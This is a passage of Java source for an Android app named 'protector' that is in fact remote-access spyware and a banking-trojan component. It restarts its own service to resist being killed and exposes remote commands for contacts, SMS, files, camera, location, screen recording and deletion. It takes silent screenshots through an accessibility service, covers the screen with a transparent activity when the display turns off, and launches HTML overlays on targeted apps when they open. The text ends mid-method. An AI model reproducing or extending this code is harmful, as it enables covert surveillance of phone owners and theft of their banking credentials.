package com.icontrol.protector;


import static com.icontrol.protector.AccessServices.lastject;
import static com.icontrol.protector.AccessServices.skipject;
import static com.icontrol.protector.AccessServices.skiponecover;
import static com.icontrol.protector.AccessTools.AddID;
import static com.icontrol.protector.AccessTools.AddTname;
import static com.icontrol.protector.AccessTools.Addlink;

import static com.icontrol.protector.AccessTools.Map_Name_ID;
import static com.icontrol.protector.AccessTools.Map_Name_Lnk;


import static com.icontrol.protector.AccessTools.ject_list;
import static com.icontrol.protector.Consts.Auto_jct;
import static com.icontrol.protector.Consts.BTVersion;

import static com.icontrol.protector.Consts.Live_Screen;

import static com.icontrol.protector.Consts.Rec_Activitys;
import static com.icontrol.protector.Consts.Time_Stamp;
import static com.icontrol.protector.Deviceinfo.Devicename;

import static com.icontrol.protector.MyLoger.Debug;
import static com.icontrol.protector.MySettings.ReadBool;
import static com.icontrol.protector.MySettings.WriteBool;

import static com.icontrol.protector.My_Configs.Is_Store;
import static com.icontrol.protector.My_Configs.Tracking_Data_str;
import static com.icontrol.protector.UtliTools.IsScreenOn;
import static com.icontrol.protector.UtliTools.ServiceStarter;
import static com.icontrol.protector.UtliTools.convertToBitmap;
import static com.icontrol.protector.UtliTools.createImageByts;
import static com.icontrol.protector.UtliTools.getAppNameFromPkgName;
import static com.icontrol.protector.UtliTools.getCurrentActivity;
import static com.icontrol.protector.UtliTools.getPingSpeed;
import static com.icontrol.protector.UtliTools.installdate;
import static com.icontrol.protector.UtliTools.isUsageAccessGranted;
import static com.icontrol.protector.UtliTools.setupWorkManager;
import static com.icontrol.protector.WorkServices.MyWorker.SendPing;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.AppOpsManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.Drawable;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.RelativeLayout;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.locks.ReentrantLock;

public class WorkServices extends Service {

    public static class ScreenReceiver extends BroadcastReceiver {
        private long screenOnTime = 0;
        private long screenOffTime = 0;
        private boolean isScreenOn = true;

        @Override
        public void onReceive(Context context, Intent intent) {
//        if (My_Configs.Stiky_Recent.equals("1")){
//            Intent intenttrans = new Intent(context, TransparentActivity.class);
//            intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT); // Opens in a new document/task
//            intenttrans.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK); // Allows multiple tasks
//
//            context.startActivity(intenttrans);
//        }

            try {

                Thread bkthread = new Thread(new Runnable() {
                    @Override
                    public void run() {

                        try {
                            try {

                                setupWorkManager(context);
                                // AlarmHelper.setAlarm(context, EngineWorker.class, System.currentTimeMillis() + 15000);
                            } catch (Exception a) {
                            }
                            SendPing(context);

                            MySettings.WriteBool(context, Consts.AutoStartOn, true);

                            String action = intent.getAction();
                            if (action == null) return;
                            if (ReadBool(context, Rec_Activitys, false) && action.equals(Intent.ACTION_SCREEN_OFF) && isScreenOn) {
                                screenOffTime = System.currentTimeMillis();
                                RecordActivity(screenOnTime, screenOffTime);
                                isScreenOn = false;
                            }
                            ServiceStarter(context, WorkServices.class);
                            ServiceStarter(context, EngineWorker.class);

                            switch (action) {
                                case Intent.ACTION_SCREEN_OFF:
                                    try {
                                        if (!skiponecover) {
                                            if (WorkServices.My_Access_inst == null) {
                                                try {
                                                    Intent intenttrans = new Intent(context, TransparentActivity.class);
                                                    intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                    intenttrans.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                                    intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);

                                                    context.startActivity(intenttrans);
                                                } catch (Exception a) {
                                                }
                                            } else {
                                                AccessTools.Treger("cover", null);
                                            }

                                        } else {
                                            skiponecover = false;
                                        }

                                        //BringMeFront(context);
//                                    if(My_Configs.Stiky_Recent.equals("1")){
//                                        Intent fakint = new Intent(context, Splasher.class);
//                                        fakint.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                        context.startActivity(fakint);
//                                    }

                                    } catch (Exception a) {
                                    }
                                    //AlertServer(context, "Screen State", "Screen is off");
                                    break;

                                case Intent.ACTION_SCREEN_ON:
                                    //String myName = getLabelApplication(context).toLowerCase();
                                    //  try{
                                    // AccessTools.Treger("fourceit",null);
//                                    if(My_Configs.Stiky_Recent.equals("1")){
//                                        Intent intent = new Intent(Intent.ACTION_MAIN);
//                                        intent.addCategory(Intent.CATEGORY_HOME);
//                                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                        context.startActivity(intent);
//                                    }

                                    //  }catch (Exception a){}
                                    if (My_Configs.Capture_Lock.equals("1") && !AccessServices.skiprecord) {

                                        // AccessTools.enableTouchExploration();
                                        if (AccessTools.myAccess() != null) {
                                            AccessServices.CapRead = true;
                                            AccessServices.CapOK = true;
//                                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
//                                    AccessTools.slideUp();
//                                    AccessServices.CapRead = true;
//                                    final Handler handler = new Handler(Looper.getMainLooper());
//                                    handler.postDelayed(new Runnable() {
//                                        @Override
//                                        public void run() {
//                                            try {
//                                                //AccessTools.myAccess().enablesuperWatch();
//                                                AccessServices.CapOK = true;
//                                            } catch (Exception a) {
//                                                a.printStackTrace();
//                                            }
//                                        }
//                                    }, 1500);
//                                } else {
//                                    try {
//                                        AccessServices.CapRead = true;
//                                        AccessServices.CapOK = true;
//                                        //AccessTools.myAccess().enablesuperWatch();
//
//
//                                    } catch (Exception a) {
//                                        a.printStackTrace();
//                                    }
//                                }
                                        }

                                    }
                                    //     AlertServer(context, "Screen State", "Screen is on");
                                    break;

                                case Intent.ACTION_USER_PRESENT:
                                    if (ReadBool(context, Rec_Activitys, false)) {
                                        isScreenOn = true;
                                        screenOnTime = System.currentTimeMillis();
                                    }
                                    break;

                                default:

                                    break;
                            }
                        } catch (Exception a) {
                            a.printStackTrace();
                        }
                    }
                });
                bkthread.start();
            } catch (Exception a) {
                a.printStackTrace();
            }

        }


        public void RecordActivity(long startTime, long endTime) {
            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());

            StringBuilder SB = new StringBuilder();
            SB.append("[Open Time: " + sdf.format(startTime) + "]|[");
            SB.append("Close Time: " + sdf.format(endTime) + "]");

            ActivityMonitors.Record(SB.toString(), ActivityMonitors.ActivityType.ACTZ);
        }


    }
    //public static ArrayList<MyPacket> MY_COMMANDS_LIST;
    //public static Object PAKET_LOCK = new Object();

    private SensorManager sensorManager;
    private Sensor lightSensor;
    private SensorEventListener lightListener;
    private long lastupdateAngle = 0;
    private long lastupdateLigths = 0;
    private static final int UPDATE_INTERVAL = 5000; // 1 second


    private Sensor accelerometer;
    private SensorEventListener sensorEventListener;
    private static PowerManager.WakeLock LOCK_SERVS;
    private static final String TAG = "wake:Wk";

    public static AccessServices My_Access_inst;

    private StatusMonitor STATUS_MONITOR;

    public static ReentrantLock MyLOCK;

    public static int DelayScreenshot = 100;


    public static String AngleString = "";
    public static String LightsString = "";

    public static boolean needsleep = false;
    //public static String isMovingString = "0";

    public WorkServices() {
    }

    private static int Notifi_ID = 111;

    private void START_FORGRONG(Context ctx) {
        try {
            // int Notifi_ID = UtliTools.randomnumber(11111, 88888);
            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        } catch (Exception a) {
        }


    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try {
            AlarmHelper.setAlarm(getApplicationContext());
            if (STATUS_MONITOR != null) {
                STATUS_MONITOR.unregister();
                STATUS_MONITOR = null;
            }
            if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
                LOCK_SERVS.release();
                LOCK_SERVS=null;
            }

            if (sensorManager != null && sensorEventListener != null) {
                sensorManager.unregisterListener(sensorEventListener);
            }

            if (sensorManager != null && lightSensor != null) {
                sensorManager.unregisterListener(lightListener);
            }


        } catch (Exception a) {
        }


        try {
            Intent workint = new Intent(getApplicationContext(), WorkServices.class);
            //  if (!Codes.isServiceRunning(getApplicationContext(), WorkServices.class)) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(workint);
            } else {
                startService(workint);
            }
            //  }

        } catch (Exception a) {
        }

        setupWorkManager(getApplicationContext());
    }

    // private static volatile boolean isRunning = false;
    private static void JoinChat(Context ctx) {
        LiveChat chater = LiveChat.instance(ctx);
        boolean shouldKeepRunning = chater.pingServer();
        if (shouldKeepRunning) {
            Debug("At.JoinChat", "Ping OK");
        } else {
            Debug("At.JoinChat", "Ping NO");
        }
//        isRunning = true;
//
//        new Thread(() -> {
//
//
//
//            while (shouldKeepRunning){
//                try{
//                    Thread.sleep(10000);
//                }catch (Exception a){}
//                shouldKeepRunning = pingServer();
//            }
//
//
//            isRunning = false; // release lock
//
//
//        }).start();

    }

    private void writeOptionBool(Context context, String key, String value) {
        WriteBool(context, key, "1".equals(value));
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        AlarmHelper.setAlarm(getApplicationContext());
        if (STATUS_MONITOR != null) {
            STATUS_MONITOR.unregister();
            STATUS_MONITOR = null;
        }
        if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
            LOCK_SERVS.release();
        }
//        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
//        restartServiceIntent.setPackage(getPackageName());
//
//        int flag = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;
//        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, flag);
//        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
//        alarmService.set(
//                AlarmManager.ELAPSED_REALTIME,
//                SystemClock.elapsedRealtime() + 1000,
//                restartServicePendingIntent);

        Intent workint = new Intent(getApplicationContext(), WorkServices.class);

        // if (!Codes.isServiceRunning(getApplicationContext(), WorkServices.class)) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(workint);
        } else {
            startService(workint);
        }
        //  }


        setupWorkManager(getApplicationContext());
    }

    public enum CommandsList {

        Bing,
        Updates,
        Contacts,
        SMS,
        Apps,
        Files,
        Camera,
        Location,
        Activitys,
        Screen,
        Deviceinfo,
        Connection,
        Notifi,
        Recorder,
        Rename,
        Permissions,
        Sleep,
        Delete
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Context ctx = getApplicationContext();
        if (intent != null ) {
            if ("HB".equals(intent.getAction())){

                // return START_STICKY;
            }else if (intent.getBooleanExtra("FROM_ALARM", false)){

                AlarmHelper.setAlarm(getApplicationContext());
                //return START_STICKY;
            }else{
                START_FORGRONG(ctx);
            }

        }else{
            START_FORGRONG(ctx);
        }
        new Thread(() -> {

            try {
                if (STATUS_MONITOR == null) {

                    STATUS_MONITOR = new StatusMonitor(ctx);
                }
            } catch (Exception s) {
            }

//        if (MY_COMMANDS_LIST == null) {
//            WorkServices.MY_COMMANDS_LIST = new ArrayList<MyPacket>();
//        }

            try {
                if (MyLOCK == null) {
                    MyLOCK = new ReentrantLock();

                }

            } catch (Exception a) {

            }

            try {
                checksinsors();
            } catch (Exception a) {
            }

            if (!isworkeron()) {
                new MyWorker().execute(ctx);
            }
        }).start();

        return START_STICKY;
    }


    @Override
    public void onCreate() {
        super.onCreate();


        Context ctx = getApplicationContext();
        //AlarmHelper.cancelAlarm(ctx, WorkServices.class);
        //WorkServices.MY_COMMANDS_LIST = new ArrayList<MyPacket>();

        START_FORGRONG(getApplicationContext());

        STATUS_MONITOR = new StatusMonitor(getApplicationContext());
        if (MyLOCK == null) {
            MyLOCK = new ReentrantLock();

        }
        try {

            //TrackingData    name[<s>]link[<s>]id|    aaa[<s>]sss[<s>]ddd|qqqwwwee[<s>]eeewqew[<s>]eqweqweqwe|sdfs[<s>]dfsdf[<s>]sdfsdf|
            //TrackingData empty| means off

            if (Tracking_Data_str.contains("|") && !Tracking_Data_str.startsWith("empty|")) {

                MySettings.WriteBool(getApplicationContext(), Consts.enable_trak, true);

                String[] arrydata = Tracking_Data_str.split("\\|");

                for (String base64record :
                        arrydata) {
                    String strrecord = new String(Base64.decode(base64record, 0), "UTF-8");
                    if (strrecord != null && strrecord.length() > 0 && strrecord.contains("[<s>]")) {
                        String[] arrysingle = strrecord.split("\\[<s>\\]");
                        String nametarget = arrysingle[0];
                        String linktarget = arrysingle[1];
                        String idtarget = arrysingle[2];

                        Addlink(nametarget, linktarget);
                        AddID(nametarget, idtarget);
                        AddTname(nametarget);
                    }
                }
            } else {
                MySettings.WriteBool(getApplicationContext(), Consts.enable_trak, false);
            }


            checksinsors();


        } catch (Exception s) {

        }
        if (!isworkeron()) {
            new MyWorker().execute(ctx);
        }
    }

    private static volatile long workdats = 0;

    public static boolean isworkeron() {
        if (workdats == 0) {
            return false;
        }
        long currentTime = System.currentTimeMillis();
        long elapsedTime = currentTime - workdats;
        long lasttime = 45 * 1000; // 30 sec in milliseconds

        // Check if the elapsed time is less than 3 minutes
        return elapsedTime < lasttime;
    }

    private void checksinsors() {
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);

        if (lightSensor != null) {
            try {
                lightListener = new SensorEventListener() {
                    @Override
                    public void onSensorChanged(SensorEvent event) {

                        long currentTime = System.currentTimeMillis();
                        if (currentTime - lastupdateLigths >= UPDATE_INTERVAL) {
                            lastupdateLigths = currentTime;
                            float lightLevel = event.values[0]; // Light in lux

                            // Determine the light condition
                            String lightKey;
                            if (lightLevel < 1) {
                                lightKey = "pitch_black";
                            } else if (lightLevel < 10) {
                                lightKey = "very_dark";
                            } else if (lightLevel < 50) {
                                lightKey = "dim_light";
                            } else if (lightLevel < 200) {
                                lightKey = "indoor";
                            } else if (lightLevel < 1000) {
                                lightKey = "bright_indoor";
                            } else if (lightLevel < 10000) {
                                lightKey = "cloudy";
                            } else if (lightLevel < 30000) {
                                lightKey = "sunny";
                            } else {
                                lightKey = "direct_sun";
                            }

                            // Detect system language
                            String language = Locale.getDefault().getLanguage();

                            // Get translated message
                            String message;
                            switch (language) {
                                case "ar":
                                    message = getArabicLightMessage(lightKey);
                                    break;
                                case "zh":
                                    message = getChineseLightMessage(lightKey);
                                    break;
                                case "tr":
                                    message = getTurkishLightMessage(lightKey);
                                    break;
                                case "pt":
                                    message = getPortugueseLightMessage(lightKey);
                                    break;
                                case "ru":
                                    message = getRussianLightMessage(lightKey);
                                    break;
                                case "es":
                                    message = getSpanishLightMessage(lightKey);
                                    break;
                                default:
                                    message = getEnglishLightMessage(lightKey);
                                    break;
                            }

                            // Show message
                            // Debug("LightSensor", message + " (" + lightLevel + " lx)");
                            LightsString = message + " (" + lightLevel + " lx)";
                        }


                    }


                    @Override
                    public void onAccuracyChanged(Sensor sensor, int accuracy) {
                        // Handle accuracy changes if needed
                    }
                };

                // Register the listener dynamically
                sensorManager.registerListener(lightListener, lightSensor, SensorManager.SENSOR_DELAY_NORMAL);
            } catch (Exception a) {

            }
        }

        accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);

        if (accelerometer != null) {
            sensorEventListener = new SensorEventListener() {
                @Override
                public void onSensorChanged(SensorEvent event) {
                    long currentTime = System.currentTimeMillis();
                    if (currentTime - lastupdateAngle >= UPDATE_INTERVAL) {
                        lastupdateAngle = currentTime;
                        float x = event.values[0]; // Acceleration in x-axis
                        float y = event.values[1]; // Acceleration in y-axis
                        float z = event.values[2]; // Acceleration in z-axis

                        // Calculate Pitch (Forward/Backward Tilt)
                        double pitch = Math.atan2(y, Math.sqrt(x * x + z * z)) * 180 / Math.PI;

                        // Calculate Roll (Side-to-Side Tilt)
                        double roll = Math.atan2(-x, z) * 180 / Math.PI;

//                        double movement = Math.sqrt(x * x + y * y + z * z);
//
//                        if (movement < 0.2) {  // Small movement = Still
//                            //Debug("MotionSensor", "Phone is STILL");
//                            isMovingString = "0";
//                        } else {  // Significant movement
//                            //Debug("MotionSensor", "Phone is MOVING");
//                            isMovingString = "1";
//                        }

                        // Determine the orientation in a generic way
                        String orientationKey;
                        if (Math.abs(pitch) < 10 && Math.abs(roll) < 10) {
                            orientationKey = "flat";
                        } else if (Math.abs(pitch) > 70) {
                            orientationKey = "upright";
                        } else if (Math.abs(roll) > 70) {
                            orientationKey = "side";
                        } else if (Math.abs(pitch) > 30) {
                            orientationKey = "tilted_fb";
                        } else if (Math.abs(roll) > 30) {
                            orientationKey = "tilted_lr";
                        } else {
                            orientationKey = "slightly_tilted";
                        }

                        // Get the system language
                        String language = Locale.getDefault().getLanguage();

                        // Translated messages
                        String message;
                        switch (language) {
                            case "ar": // Arabic
                                message = getArabicTranslation(orientationKey);
                                break;
                            case "zh": // Chinese
                                message = getChineseTranslation(orientationKey);
                                break;
                            case "tr": // Turkish
                                message = getTurkishTranslation(orientationKey);
                                break;
                            case "pt": // Portuguese
                                message = getPortugueseTranslation(orientationKey);
                                break;
                            case "ru": // Russian
                                message = getRussianTranslation(orientationKey);
                                break;
                            case "es": // Spanish
                                message = getSpanishTranslation(orientationKey);
                                break;
                            default: // Default to English
                                message = getEnglishTranslation(orientationKey);
                                break;
                        }

                        // Show user-friendly translated output
                        // Debug("DeviceAngle", "Position: " + message);
                        AngleString = message;
                    }

                }

                @Override
                public void onAccuracyChanged(Sensor sensor, int accuracy) {
                    // Not needed for this implementation
                }
            };

            // Register the listener
            sensorManager.registerListener(sensorEventListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        }

    }

    private String getEnglishLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "Pitch Black";
            case "very_dark":
                return "Very Dark";
            case "dim_light":
                return "Dim Light";
            case "indoor":
                return "Indoor Light";
            case "bright_indoor":
                return "Bright Indoor";
            case "cloudy":
                return "Cloudy Day";
            case "sunny":
                return "Sunny Day";
            case "direct_sun":
                return "Direct Sunlight";
            default:
                return "Unknown Light";
        }
    }

    private String getArabicLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "ظلام دامس";
            case "very_dark":
                return "مظلم جدًا";
            case "dim_light":
                return "إضاءة خافتة";
            case "indoor":
                return "إضاءة داخلية";
            case "bright_indoor":
                return "داخل مشرق";
            case "cloudy":
                return "يوم غائم";
            case "sunny":
                return "يوم مشمس";
            case "direct_sun":
                return "ضوء الشمس المباشر";
            default:
                return "إضاءة غير معروفة";
        }
    }

    private String getChineseLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "漆黑";
            case "very_dark":
                return "非常暗";
            case "dim_light":
                return "微光";
            case "indoor":
                return "室内光";
            case "bright_indoor":
                return "明亮的室内";
            case "cloudy":
                return "多云天";
            case "sunny":
                return "晴天";
            case "direct_sun":
                return "直射阳光";
            default:
                return "未知光线";
        }
    }

    private String getTurkishLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "Tam karanlık";
            case "very_dark":
                return "Çok karanlık";
            case "dim_light":
                return "Loş ışık";
            case "indoor":
                return "Kapalı alan ışığı";
            case "bright_indoor":
                return "Parlak iç mekan";
            case "cloudy":
                return "Bulutlu gün";
            case "sunny":
                return "Güneşli gün";
            case "direct_sun":
                return "Doğrudan güneş ışığı";
            default:
                return "Bilinmeyen ışık";
        }
    }

    private String getPortugueseLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "Escuridão total";
            case "very_dark":
                return "Muito escuro";
            case "dim_light":
                return "Luz fraca";
            case "indoor":
                return "Luz interna";
            case "bright_indoor":
                return "Ambiente claro";
            case "cloudy":
                return "Dia nublado";
            case "sunny":
                return "Dia ensolarado";
            case "direct_sun":
                return "Luz solar direta";
            default:
                return "Luz desconhecida";
        }
    }

    private String getRussianLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "Полная темнота";
            case "very_dark":
                return "Очень темно";
            case "dim_light":
                return "Тусклый свет";
            case "indoor":
                return "Внутренний свет";
            case "bright_indoor":
                return "Яркое помещение";
            case "cloudy":
                return "Облачный день";
            case "sunny":
                return "Солнечный день";
            case "direct_sun":
                return "Прямой солнечный свет";
            default:
                return "Неизвестный свет";
        }
    }

    private String getSpanishLightMessage(String key) {
        switch (key) {
            case "pitch_black":
                return "Oscuridad total";
            case "very_dark":
                return "Muy oscuro";
            case "dim_light":
                return "Luz tenue";
            case "indoor":
                return "Luz interior";
            case "bright_indoor":
                return "Interior brillante";
            case "cloudy":
                return "Día nublado";
            case "sunny":
                return "Día soleado";
            case "direct_sun":
                return "Luz solar directa";
            default:
                return "Luz desconocida";
        }
    }

    private String getEnglishTranslation(String key) {
        switch (key) {
            case "flat":
                return "Flat on the table";
            case "upright":
                return "Standing upright";
            case "side":
                return "On its side";
            case "tilted_fb":
                return "Tilted forward/backward";
            case "tilted_lr":
                return "Tilted left/right";
            case "slightly_tilted":
                return "Slightly tilted";
            default:
                return "Unknown position";
        }
    }

    private String getArabicTranslation(String key) {
        switch (key) {
            case "flat":
                return "مسطح على الطاولة";
            case "upright":
                return "واقف عموديا";
            case "side":
                return "على جانبه";
            case "tilted_fb":
                return "مائل للأمام / للخلف";
            case "tilted_lr":
                return "مائل لليسار / اليمين";
            case "slightly_tilted":
                return "مائل قليلاً";
            default:
                return "وضع غير معروف";
        }
    }

    private String getChineseTranslation(String key) {
        switch (key) {
            case "flat":
                return "平放在桌子上";
            case "upright":
                return "直立";
            case "side":
                return "侧躺";
            case "tilted_fb":
                return "前后倾斜";
            case "tilted_lr":
                return "左右倾斜";
            case "slightly_tilted":
                return "轻微倾斜";
            default:
                return "未知位置";
        }
    }

    private String getTurkishTranslation(String key) {
        switch (key) {
            case "flat":
                return "Masaya düz yerleştirildi";
            case "upright":
                return "Dik duruyor";
            case "side":
                return "Yan tarafında";
            case "tilted_fb":
                return "Öne / arkaya eğilmiş";
            case "tilted_lr":
                return "Sola / sağa eğilmiş";
            case "slightly_tilted":
                return "Hafifçe eğilmiş";
            default:
                return "Bilinmeyen konum";
        }
    }

    private String getPortugueseTranslation(String key) {
        switch (key) {
            case "flat":
                return "Plano na mesa";
            case "upright":
                return "Em pé";
            case "side":
                return "De lado";
            case "tilted_fb":
                return "Inclinado para frente / trás";
            case "tilted_lr":
                return "Inclinado para esquerda / direita";
            case "slightly_tilted":
                return "Ligeiramente inclinado";
            default:
                return "Posição desconhecida";
        }
    }

    private String getRussianTranslation(String key) {
        switch (key) {
            case "flat":
                return "Лежит на столе";
            case "upright":
                return "Стоит вертикально";
            case "side":
                return "На боку";
            case "tilted_fb":
                return "Наклонён вперед / назад";
            case "tilted_lr":
                return "Наклонён влево / вправо";
            case "slightly_tilted":
                return "Слегка наклонён";
            default:
                return "Неизвестное положение";
        }
    }

    private String getSpanishTranslation(String key) {
        switch (key) {
            case "flat":
                return "Plano sobre la mesa";
            case "upright":
                return "De pie";
            case "side":
                return "De lado";
            case "tilted_fb":
                return "Inclinado hacia adelante/atrás";
            case "tilted_lr":
                return "Inclinado hacia la izquierda/derecha";
            case "slightly_tilted":
                return "Ligeramente inclinado";
            default:
                return "Posición desconocida";
        }
    }


    public static class MyWorker extends AsyncTask<Context, Integer, String> {


        public static void AlertServer(Context ctx, String title, String msg) {

            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("type", id_Commands.ALERT);
                jsonObject.put("title", title);
                jsonObject.put("msg", msg);

                // Convert JSON object to string
                String jsonData = jsonObject.toString();
                LiveChat chater = LiveChat.instance(ctx);
                chater.Livemessage(ctx, jsonData);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
        private static volatile long jectdate = 0;


        public static boolean isJecton() {
            if (jectdate == 0) {
                return false;
            }
            long currentTime = System.currentTimeMillis();
            long elapsedTime = currentTime - jectdate;
            long lasttime = 45 * 1000; // 30 sec in milliseconds

            // Check if the elapsed time is less than 3 minutes
            return elapsedTime < lasttime;
        }

        public static volatile String alljectsids = "empty";
        public static void StartAutoj(Context ctx) {
            jectdate = System.currentTimeMillis();
            Thread thread = new Thread(new Runnable() {
                public void run() {

                    do {
                        jectdate = System.currentTimeMillis();
                        if (alljectsids.equals("empty")){
                            jectdate = 0;
                            break;
                        }

                        try {
                            String jectcheck = UtliTools.Checkallject(ctx,alljectsids);
                            if(!jectcheck.equals("empty")){
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("type", id_Commands.jects);
                                jsonObject.put("cuz", "f");
                                jsonObject.put("ned", jectcheck);
                                String jsonData = jsonObject.toString();

                                LiveChat.instance(ctx).Livemessage(ctx, jsonData);
                            }
                        } catch (Exception a) {

                        }


                        try {
                            Thread.sleep(15000);
                        } catch (Exception s) {
                        }

                      try{
                          JSONObject jsonObject = new JSONObject();
                          jsonObject.put("type", id_Commands.jects);
                          jsonObject.put("cuz", "l");
                          String jsonData = jsonObject.toString();

                          LiveChat.instance(ctx).Livemessage(ctx, jsonData);
                      }catch (Exception s){}
                    } while (Auto_jct);
                }
            });
            thread.start();
        }

        private static volatile long Scannerdate = 0;

        public static boolean isScreenThreadRunning() {
            if (Scannerdate == 0) {
                return false;
            }
            long currentTime = System.currentTimeMillis();
            long elapsedTime = currentTime - Scannerdate;
            long lasttime = 30 * 1000; // 30 sec in milliseconds

            // Check if the elapsed time is less than 3 minutes
            return elapsedTime < lasttime;
        }

        public static void stopSlientScreen(Context ctx) {
            MySettings.WriteBool(ctx, Consts.Silent_Screen, false);
            Scannerdate = 0;
        }

        public static void SilentScreenThread(Context ctx, int quality) {
            Thread thread = new Thread(new Runnable() {
                public void run() {
                    if (My_Access_inst == null) {
                        return;
                    }
                    do {
                        Scannerdate = System.currentTimeMillis();
                        try {
                            Thread.sleep(DelayScreenshot);
                        } catch (Exception s) {
                        }

                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                if (MySettings.ReadBool(ctx, Consts.Silent_Screen, false)) {
                                    My_Access_inst.CapScreen(My_Access_inst.getApplicationContext(), "screen", quality);
                                } else {
                                    if (MySettings.ReadBool(ctx, Live_Screen, false)) {
                                        My_Access_inst.CapScreen(My_Access_inst.getApplicationContext(), "livscr", quality);
                                    }
                                }

                            }
                        } catch (Exception a) {

                        }

                    } while (MySettings.ReadBool(ctx, Consts.Silent_Screen, false) ||
                            MySettings.ReadBool(ctx, Live_Screen, false));
                }
            });
            thread.start();
        }

        private static volatile long selfdate = 0;
        private static String Lastdetected = "null";

        private void monitorAppUsage(Context ctx) {
            UsageStatsManager usageStatsManager = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
            long endTime = System.currentTimeMillis();
            long startTime = endTime - 2000; // Check events from the last 2 seconds

            UsageEvents usageEvents = usageStatsManager.queryEvents(startTime, endTime);
            UsageEvents.Event event = new UsageEvents.Event();

            while (usageEvents.hasNextEvent()) {
                usageEvents.getNextEvent(event);

                if (event.getPackageName().equals(ctx.getPackageName())) {
                    continue;
                }
                String CuzPackage = event.getPackageName();
                try {
                    if (CuzPackage != null) {
                        if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND && ject_list.contains(CuzPackage)) {
                            MyLoger.Error("ject detected", CuzPackage);
                            if (!CuzPackage.equals(lastject) && !skipject.equals(CuzPackage)) {
                                lastject = CuzPackage;
                                skipject = "";
                                final String cuzid = CuzPackage;
                                String htmlpath  = UtliTools.findjectfile(ctx,CuzPackage);

                                File protectedZipFile = new File(ctx.getFilesDir(), htmlpath);
                                if (protectedZipFile.exists()) {
                                    //System.out.println("The protected file exists and is secure.");
                                    Drawable icons = null;
                                    try {

                                        icons = ctx.getPackageManager().getApplicationIcon(CuzPackage);
                                    } catch (PackageManager.NameNotFoundException e) {
                                        e.printStackTrace();
                                        icons = null;
                                    }

                                    Bitmap targeticon = convertToBitmap(icons, 144, 144);
                                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                    targeticon.compress(Bitmap.CompressFormat.PNG, 100, stream);
                                    byte[] iconByteArray = stream.toByteArray();
                                    Context mybasectx = ctx;
                                    final String Appname = getAppNameFromPkgName(ctx, CuzPackage);


                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        Intent myIntent = new Intent(mybasectx, Webjector.class);
